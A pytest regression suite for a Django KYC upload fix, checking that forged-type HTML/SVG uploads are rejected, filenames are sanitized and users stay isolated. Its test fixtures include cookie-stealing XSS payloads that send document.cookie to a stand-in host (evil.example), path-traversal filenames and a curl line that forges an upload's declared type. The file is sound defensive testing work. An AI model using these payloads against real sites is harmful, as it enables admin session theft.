"""
 — KYC uploads are validated by sniffed content, not the client's claim.

The vulnerability: both KYC upload views gated on `UploadedFile.content_type`,
the `Content-Type` the *uploader* wrote on the multipart part. It is free to
choose (`curl -F "file=@evil.html;type=application/pdf"`). The filename was then
stored verbatim, so `evil.html` kept its extension; django-storages derives the
served `Content-Type` from the stored name and nginx proxies
`/uploadz/private/...` inline from https://free2z.cash. Result: attacker HTML
executing in the app's own cookie-bearing origin.

The victim is specific and bad: `uploads_auth_private` authorizes **any
superuser**, so the file is opened by whoever reviews KYC applications. That is
admin-session compromise through a workflow we ask people to use.

The invariants asserted below:

  * the BYTES decide the type, on BOTH views;
  * an extension or declared type naming an off-allowlist format is rejected
    outright, never quietly renamed;
  * the STORED name is slugified and carries an allowlisted extension, so a
    hostile filename cannot pick the served Content-Type;
  * per-field policy holds (tax forms are PDF; ID photos are rasters);
  * nobody can write to or read another user's documents.

File storage is redirected to a tmp dir (default storage in settings is GCS;
only that external boundary is swapped, per repo test rules).
"""
import json
import os
from io import BytesIO

import pytest
from PIL import Image

from django.core.files.uploadedfile import SimpleUploadedFile

from dj.apps.kyc.models import (
    UserProfile,
    W9,
    get_profile_upload_path,
    get_upload_path,
)
from dj.apps.kyc.validation import (
    IDENTITY_PHOTO_TYPES,
    KYC_DOCUMENT_EXTENSIONS,
    KYC_IMAGE_EXTENSIONS,
    KYC_TAX_FORM_EXTENSIONS,
    SUPPORTING_DOCUMENT_TYPES,
    TAX_FORM_TYPES,
    UploadTypeError,
    normalize_stored_name,
    validate_kyc_upload,
)


@pytest.fixture(autouse=True)
def _local_media(settings, tmp_path):
    settings.STORAGES = {
        **settings.STORAGES,
        "default": {
            "BACKEND": "django.core.files.storage.FileSystemStorage",
        },
    }
    settings.MEDIA_ROOT = str(tmp_path)


# ---------------------------------------------------------------------------
# Payloads
# ---------------------------------------------------------------------------

def _raster_bytes(fmt, size=(8, 8)):
    image = Image.new("RGB", size, (10, 120, 200))
    out = BytesIO()
    image.save(out, format=fmt)
    return out.getvalue()


PNG = _raster_bytes("PNG")
JPEG = _raster_bytes("JPEG")
WEBP = _raster_bytes("WEBP")
GIF = _raster_bytes("GIF")
TIFF = _raster_bytes("TIFF")
# A bare ISO-BMFF `ftyp` box with the `heic` brand. This asserts
# identification, not decodability: HEIC/AVIF are deliberately absent from
# uploads/validation.py's _PILLOW_FORMATS second-stage confirmation table,
# regardless of Pillow's available codecs. A truncated HEIC can therefore
# pass validation and reach the review queue as an unopenable file, matching
# the uploads app's policy. Requiring decodable pixels would be a separate
# validation-policy change; a Pillow upgrade alone must not change this test.
HEIC = b'\x00\x00\x00\x18ftypheic\x00\x00\x00\x00heicmif1' + b'\x00' * 64
#the same container with the HEVC image-*sequence* brand. The bytes
# were already identified; it was the `.heics` extension that 400'd.
HEIC_SEQUENCE = b'\x00\x00\x00\x18ftyphevc\x00\x00\x00\x00hevcmif1' + b'\x00' * 64

PDF = (
    b'%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\ntrailer<</Root 1 0 R>>\n'
    b'%%EOF\n'
)
MP3 = b'ID3\x04\x00\x00\x00\x00\x00\x00' + b'\xff\xfb\x90\x00' + b'\x00' * 64

# The payload from the issue: an admin-session stealer aimed at the KYC
# reviewer.
EVIL_HTML = (
    b'<!doctype html><html><body><script>'
    b'fetch("https://evil.example/?c="+document.cookie)'
    b'</script></body></html>'
)
EVIL_SVG = (
    b'<svg xmlns="http://www.w3.org/2000/svg">'
    b'<script>fetch("https://evil.example/"+document.cookie)</script>'
    b'</svg>'
)
EVIL_XHTML = (
    b'<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml">'
    b'<body><script>alert(document.domain)</script></body></html>'
)


def _upload(name, payload, declared):
    return SimpleUploadedFile(name, payload, content_type=declared)


@pytest.fixture
def applicant(creator_factory):
    """A user with a NEW (editable) KYC profile, filing as a US individual."""
    user = creator_factory()
    profile = UserProfile.objects.create(
        user=user, is_us=True, is_individual=True)
    return user, profile


def _authed(api_client, user):
    api_client.force_authenticate(user=user)
    return api_client


TAX_FORM_URL = "/api/kyc/upload-tax-form"
IDENTITY_URL = "/api/kyc/identity-documents"


# ---------------------------------------------------------------------------
# TaxFormUploadView — the reported flaw
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("name,payload,declared", [
    # The literal reproduction from the issue.
    ("review.html", EVIL_HTML, "application/pdf"),
    ("review.svg", EVIL_SVG, "application/pdf"),
    ("review.xhtml", EVIL_XHTML, "application/pdf"),
    # Same bytes, honest name — the extension is off-allowlist either way.
    ("review.html", EVIL_HTML, "text/html"),
    # Innocuous-looking name, hostile bytes: nothing sniffs as an allowed type.
    ("w9.pdf", EVIL_HTML, "application/pdf"),
    ("w9.pdf", EVIL_SVG, "application/pdf"),
])
@pytest.mark.django_db
def test_tax_form_rejects_forged_pdf(api_client, applicant, name, payload, declared):
    user, profile = applicant
    response = _authed(api_client, user).post(
        TAX_FORM_URL, {"file": _upload(name, payload, declared)},
        format="multipart")

    assert response.status_code == 400, response.content
    assert not W9.objects.filter(profile=profile).exclude(file="").exists()


@pytest.mark.django_db
def test_tax_form_accepts_a_real_pdf(api_client, applicant):
    user, profile = applicant
    response = _authed(api_client, user).post(
        TAX_FORM_URL, {"file": _upload("fw9.pdf", PDF, "application/pdf")},
        format="multipart")

    assert response.status_code == 201, response.content
    stored = W9.objects.get(profile=profile).file.name
    assert stored.startswith(f"{profile.id}/")
    assert stored.endswith(".pdf")


@pytest.mark.django_db
def test_tax_form_rejects_an_image_even_though_it_is_allowlisted_elsewhere(
        api_client, applicant):
    """The shared allowlist accepts JPEG; the tax-form *field* does not."""
    user, _ = applicant
    response = _authed(api_client, user).post(
        TAX_FORM_URL, {"file": _upload("fw9.jpg", JPEG, "image/jpeg")},
        format="multipart")

    assert response.status_code == 400, response.content
    assert b"application/pdf" in response.content


@pytest.mark.django_db
def test_tax_form_normalizes_a_hostile_filename(api_client, applicant):
    """
    The stored extension is what the object is *served* as. A name engineered
    to smuggle one past `mimetypes.guess_type` must not survive.
    """
    user, profile = applicant
    response = _authed(api_client, user).post(
        TAX_FORM_URL,
        {"file": _upload(
            "../../../W-9 <script>alert(1)</script>.pdf", PDF,
            "application/pdf")},
        format="multipart")

    assert response.status_code == 201, response.content
    stored = W9.objects.get(profile=profile).file.name
    assert stored.startswith(f"{profile.id}/")
    assert ".." not in stored
    assert "<" not in stored and ">" not in stored and " " not in stored
    assert stored.endswith(".pdf")
    # Exactly one extension: no `x.pdf.html` / `x.html.pdf` smuggling.
    assert os.path.basename(stored).count(".") == 1


@pytest.mark.django_db
def test_tax_form_missing_file_is_400_not_500(api_client, applicant):
    user, _ = applicant
    response = _authed(api_client, user).post(
        TAX_FORM_URL, {}, format="multipart")
    assert response.status_code == 400, response.content


@pytest.mark.django_db
def test_tax_form_empty_file_is_400_not_500(api_client, applicant):
    user, _ = applicant
    response = _authed(api_client, user).post(
        TAX_FORM_URL, {"file": _upload("fw9.pdf", b"", "application/pdf")},
        format="multipart")
    assert response.status_code == 400, response.content


@pytest.mark.django_db
def test_tax_form_upload_requires_auth(api_client):
    response = api_client.post(
        TAX_FORM_URL, {"file": _upload("fw9.pdf", PDF, "application/pdf")},
        format="multipart")
    assert response.status_code in (401, 403), response.content


# ---------------------------------------------------------------------------
# IdentityDocumentsView — the same flaw, same file
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("field", [
    "id_front", "id_back", "live_photo", "additional_document",
])
@pytest.mark.parametrize("name,payload,declared", [
    ("id.html", EVIL_HTML, "image/jpeg"),
    ("id.svg", EVIL_SVG, "image/png"),
    ("id.xhtml", EVIL_XHTML, "image/jpeg"),
    ("id.jpg", EVIL_HTML, "image/jpeg"),
    ("id.png", EVIL_SVG, "image/png"),
    #  taught the shared validator to accept `image/heif` as a spelling of
    # `image/heic`. That is a rename in the declared-type table only — the
    # bytes are still the sole thing that decides, so declaring it over an
    # active document buys the attacker nothing.
    ("id.heif", EVIL_SVG, "image/heif"),
    ("id.heic", EVIL_HTML, "image/heif"),
    ("id.svg", EVIL_SVG, "image/heif"),
])
@pytest.mark.django_db
def test_identity_documents_reject_forged_images(
        api_client, applicant, field, name, payload, declared):
    user, profile = applicant
    response = _authed(api_client, user).post(
        IDENTITY_URL, {field: _upload(name, payload, declared)},
        format="multipart")

    assert response.status_code == 400, response.content
    profile.refresh_from_db()
    assert not getattr(profile, field)


@pytest.mark.parametrize("payload,name,declared", [
    (JPEG, "front.jpg", "image/jpeg"),
    (PNG, "front.png", "image/png"),
    (WEBP, "front.webp", "image/webp"),
    (GIF, "front.gif", "image/gif"),
    # What an unmodified iPhone actually uploads. Rejected before this change.
    (HEIC, "front.heic", "image/heic"),
    #same bytes, same family, different spelling — what a non-Safari
    # client derives from the system MIME database for a `.heif`. This 400'd an
    # applicant out of submitting an identity document at all.
    (HEIC, "front.heif", "image/heif"),
    (HEIC, "front.heic", "image/heif"),
    #a HEIF image sequence. `IDENTITY_PHOTO_TYPES` is unchanged — the
    # canonical label is still `image/heic` — but the per-field extension list
    # the model validator uses is derived from the shared table, so this is
    # also the case that proves kyc/0008 landed.
    (HEIC_SEQUENCE, "front.heics", "image/heic-sequence"),
    (HEIC_SEQUENCE, "front.heifs", "image/heif-sequence"),
])
@pytest.mark.django_db
def test_identity_documents_accept_real_rasters(
        api_client, applicant, payload, name, declared):
    user, profile = applicant
    response = _authed(api_client, user).post(
        IDENTITY_URL, {"id_front": _upload(name, payload, declared)},
        format="multipart")

    assert response.status_code == 200, response.content
    profile.refresh_from_db()
    assert profile.id_front.name.startswith(f"{profile.id}/")


@pytest.mark.django_db
def test_identity_documents_normalize_a_hostile_filename(api_client, applicant):
    user, profile = applicant
    response = _authed(api_client, user).post(
        IDENTITY_URL,
        {"id_front": _upload("../../evil <b>ID</b>.jpg", JPEG, "image/jpeg")},
        format="multipart")

    assert response.status_code == 200, response.content
    profile.refresh_from_db()
    stored = profile.id_front.name
    assert stored.startswith(f"{profile.id}/")
    assert ".." not in stored
    assert "<" not in stored and ">" not in stored and " " not in stored
    assert stored.endswith(".jpg")
    assert os.path.basename(stored).count(".") == 1


@pytest.mark.django_db
def test_identity_photo_field_rejects_pdf(api_client, applicant):
    """`id_front` is an ImageField the admin renders in an <img>."""
    user, profile = applicant
    response = _authed(api_client, user).post(
        IDENTITY_URL, {"id_front": _upload("id.pdf", PDF, "application/pdf")},
        format="multipart")

    assert response.status_code == 400, response.content
    profile.refresh_from_db()
    assert not profile.id_front


@pytest.mark.django_db
def test_additional_document_accepts_pdf(api_client, applicant):
    """The supporting-document slot is where a utility bill / bank statement
    lands, and those are PDFs."""
    user, profile = applicant
    response = _authed(api_client, user).post(
        IDENTITY_URL,
        {"additional_document": _upload("bill.pdf", PDF, "application/pdf")},
        format="multipart")

    assert response.status_code == 200, response.content
    profile.refresh_from_db()
    assert profile.additional_document.name.endswith(".pdf")


@pytest.mark.django_db
def test_identity_documents_reject_audio(api_client, applicant):
    """On the shared allowlist, not on this field's."""
    user, profile = applicant
    response = _authed(api_client, user).post(
        IDENTITY_URL, {"id_front": _upload("id.mp3", MP3, "audio/mpeg")},
        format="multipart")

    assert response.status_code == 400, response.content
    profile.refresh_from_db()
    assert not profile.id_front


@pytest.mark.django_db
def test_identity_documents_are_all_or_nothing(api_client, applicant):
    """
    A multi-field POST with one hostile file stores NONE of them — a good file
    must not be the cover that walks a bad one in.
    """
    user, profile = applicant
    response = _authed(api_client, user).post(
        IDENTITY_URL,
        {
            "id_front": _upload("front.jpg", JPEG, "image/jpeg"),
            "id_back": _upload("back.html", EVIL_HTML, "image/jpeg"),
        },
        format="multipart")

    assert response.status_code == 400, response.content
    profile.refresh_from_db()
    assert not profile.id_front
    assert not profile.id_back


@pytest.mark.django_db
def test_identity_documents_empty_file_is_400_not_500(api_client, applicant):
    user, _ = applicant
    response = _authed(api_client, user).post(
        IDENTITY_URL, {"id_front": _upload("front.jpg", b"", "image/jpeg")},
        format="multipart")
    assert response.status_code == 400, response.content


@pytest.mark.django_db
def test_identity_documents_post_requires_auth(api_client):
    response = api_client.post(
        IDENTITY_URL, {"id_front": _upload("front.jpg", JPEG, "image/jpeg")},
        format="multipart")
    assert response.status_code in (401, 403), response.content


# ---------------------------------------------------------------------------
# TIFF: deliberately dropped. Documented here so the change is a decision,
# not an accident — see dj/apps/kyc/validation.py for the reasoning.
# ---------------------------------------------------------------------------

@pytest.mark.django_db
def test_tiff_is_no_longer_accepted(api_client, applicant):
    user, profile = applicant
    response = _authed(api_client, user).post(
        IDENTITY_URL, {"id_front": _upload("id.tiff", TIFF, "image/tiff")},
        format="multipart")

    assert response.status_code == 400, response.content
    profile.refresh_from_db()
    assert not profile.id_front


# ---------------------------------------------------------------------------
# Tenant isolation
# ---------------------------------------------------------------------------

@pytest.mark.django_db
def test_upload_always_lands_on_the_callers_own_profile(
        api_client, applicant, creator_factory):
    """
    Both views resolve the profile from `request.user` only — there is no
    request-supplied profile id to point somewhere else. Assert the stored path
    is prefixed with the caller's own profile UUID.
    """
    user, profile = applicant
    victim = creator_factory()
    victim_profile = UserProfile.objects.create(
        user=victim, is_us=True, is_individual=True)

    response = _authed(api_client, user).post(
        IDENTITY_URL, {"id_front": _upload("front.jpg", JPEG, "image/jpeg")},
        format="multipart")
    assert response.status_code == 200, response.content

    profile.refresh_from_db()
    victim_profile.refresh_from_db()
    assert profile.id_front.name.startswith(f"{profile.id}/")
    assert not victim_profile.id_front


@pytest.mark.django_db
def test_one_user_cannot_read_anothers_documents(
        api_client, applicant, creator_factory):
    user, profile = applicant
    _authed(api_client, user).post(
        IDENTITY_URL, {"id_front": _upload("front.jpg", JPEG, "image/jpeg")},
        format="multipart")
    _authed(api_client, user).post(
        TAX_FORM_URL, {"file": _upload("fw9.pdf", PDF, "application/pdf")},
        format="multipart")
    profile.refresh_from_db()
    owner_url = profile.get_id_url("id_front")
    assert owner_url

    other = creator_factory()
    other_client = _authed(api_client, other)

    identity = other_client.get(IDENTITY_URL)
    assert identity.status_code == 200, identity.content
    assert identity.json() == {
        "id_front_url": None,
        "id_back_url": None,
        "additional_document_url": None,
        "live_photo_url": None,
    }

    tax = other_client.get("/api/kyc/tax-form-file")
    assert tax.status_code in (200, 404), tax.content
    if tax.status_code == 200:
        assert tax.json()["file"] is None


# ---------------------------------------------------------------------------
# The units: name normalization and per-field policy
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("raw,expected", [
    ("fw9.pdf", "fw9.pdf"),
    ("W-9 Final (2).PDF", "w-9-final-2.pdf"),
    # The  payload: an active extension is never stored.
    ("review.html", "review"),
    ("review.svg", "review"),
    ("review.xhtml", "review"),
    ("payload.pdf.html", "payloadpdf"),
    # Path components can never escape the profile directory.
    ("../../../etc/passwd", "passwd"),
    ("/absolute/evil.png", "evil.png"),
    ("..", "file"),
    ("", "file"),
    # A name that slugifies to nothing still gets a usable stem, not a dotfile.
    ("中文.jpg", "file.jpg"),
    # splitext() treats a leading-dot name as all-stem, so this has no
    # extension at all: stored without one and therefore served
    # application/octet-stream. Inert, which is the property that matters.
    ("....jpg", "jpg"),
])
def test_normalize_stored_name(raw, expected):
    assert normalize_stored_name(raw) == expected


@pytest.mark.django_db
def test_upload_path_callables_normalize(applicant):
    _, profile = applicant
    assert get_profile_upload_path(profile, "../evil.html") == \
        f"{profile.id}/evil"
    w9 = W9.objects.create(profile=profile, full_name="A", address="B",
                           city_state_zip="C")
    assert get_upload_path(w9, "../evil.svg") == f"{profile.id}/evil"


def test_validate_kyc_upload_rejects_off_field_type():
    with pytest.raises(UploadTypeError):
        validate_kyc_upload(
            _upload("id.png", PNG, "image/png"), TAX_FORM_TYPES)


def test_validate_kyc_upload_returns_sniffed_type():
    assert validate_kyc_upload(
        _upload("fw9.pdf", PDF, "application/pdf"),
        TAX_FORM_TYPES) == "application/pdf"


def test_validate_kyc_upload_rewrites_a_mismatched_but_allowed_extension():
    """A screenshot saved as `.png` that is really JPEG bytes: stored as JPEG."""
    upload = _upload("front.png", JPEG, "image/png")
    assert validate_kyc_upload(upload, IDENTITY_PHOTO_TYPES) == "image/jpeg"
    assert upload.name.endswith(".jpg")


@pytest.mark.parametrize("ext", ["heics", "heifs", "avifs"])
def test_kyc_model_validators_gained_the_sequence_extensions(ext):
    """
    's second migration exists for these lists: they are derived from
    `uploads.validation.ALLOWED_TYPE_EXTENSIONS` and frozen into
    `FileExtensionValidator` on four `UserProfile` fields, so the shared
    widening has to be re-materialized here or the Django admin's ModelForm
    would reject a `.heics` the API just accepted.

    `KYC_TAX_FORM_EXTENSIONS` is PDF-only and must NOT have moved — that is
    the over-widening guard.
    """
    assert ext in KYC_IMAGE_EXTENSIONS
    assert ext in KYC_DOCUMENT_EXTENSIONS
    assert KYC_TAX_FORM_EXTENSIONS == ('pdf',)


def test_field_policies_are_subsets_of_the_shared_allowlist():
    from dj.apps.uploads.validation import ALLOWED_MIME_TYPES
    for policy in (TAX_FORM_TYPES, IDENTITY_PHOTO_TYPES,
                   SUPPORTING_DOCUMENT_TYPES):
        assert policy <= set(ALLOWED_MIME_TYPES)


# ---------------------------------------------------------------------------
# audit_kyc_uploads — the remediation-side check for rows that predate this fix
# ---------------------------------------------------------------------------

@pytest.mark.django_db
def test_audit_kyc_uploads_flags_a_legacy_active_document(applicant, capsys):
    """
    A row written by the OLD code (verbatim `.html` name) must be reported.
    The  production audit found zero of these; this makes that a command
    anyone can re-run instead of a claim in an issue comment.
    """
    from django.core.management import call_command

    _, profile = applicant
    # Bypass the views deliberately: this is what the pre-fix code stored.
    UserProfile.objects.filter(pk=profile.pk).update(
        id_front=f"{profile.id}/review.html")

    with pytest.raises(SystemExit) as excinfo:
        call_command("audit_kyc_uploads", "--json")
    assert excinfo.value.code == 1

    report = json.loads(capsys.readouterr().out)
    active = report["findings"]["active"]
    assert len(active) == 1, report
    assert active[0]["name"].endswith("review.html")
    assert active[0]["served_content_type"] == "text/html"


@pytest.mark.django_db
def test_audit_kyc_uploads_is_quiet_for_well_formed_rows(api_client, applicant, capsys):
    from django.core.management import call_command

    user, profile = applicant
    _authed(api_client, user).post(
        IDENTITY_URL, {"id_front": _upload("front.jpg", JPEG, "image/jpeg")},
        format="multipart")
    _authed(api_client, user).post(
        TAX_FORM_URL, {"file": _upload("fw9.pdf", PDF, "application/pdf")},
        format="multipart")

    call_command("audit_kyc_uploads", "--json")
    report = json.loads(capsys.readouterr().out)
    assert report["scanned"] == 2, report
    assert report["findings"] == {
        "active": [], "off_allowlist": [], "wrong_field": []}
